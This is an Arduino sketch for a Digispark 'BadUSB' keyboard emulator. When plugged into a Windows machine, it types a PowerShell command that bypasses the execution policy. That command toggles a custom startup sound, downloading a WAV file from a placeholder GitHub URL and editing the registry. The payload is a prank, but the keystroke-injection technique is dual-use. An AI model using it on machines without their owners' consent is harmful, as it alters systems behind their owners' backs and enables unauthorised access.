#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -NoProfile -ExecutionPolicy Bypass -Command \""
    "$u='https://raw.githubusercontent.com/tuo-utente/tuo-repo/main/suoni/Avvio.wav';"
    "$d=Join-Path $env:APPDATA 'SuoniPersonalizzati\\Avvio.wav';"
    "$original='C:\\Windows\\Media\\Windows Startup.wav';"
    "$regPath='HKCU:\\AppEvents\\Schemes\\Apps\\.Default\\SystemStart\\.Current';"
    "$current=(Get-ItemProperty -Path $regPath -Name '(Default)' -ErrorAction SilentlyContinue).'(Default)';"
    "if ($current -eq $d) {"
      "Set-ItemProperty -Path $regPath -Name '(Default)' -Value $original;"
      "Remove-Item -Path $d -Force -ErrorAction SilentlyContinue;"
    "} else {"
      "if (-not (Test-Path -Path (Split-Path $d -Parent))) {"
        "New-Item -ItemType Directory -Path (Split-Path $d -Parent) -Force };"
      "try { Invoke-WebRequest $u -OutFile $d -UseBasicParsing } catch {};"
      "Set-ItemProperty -Path $regPath -Name '(Default)' -Value $d "
    "}\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
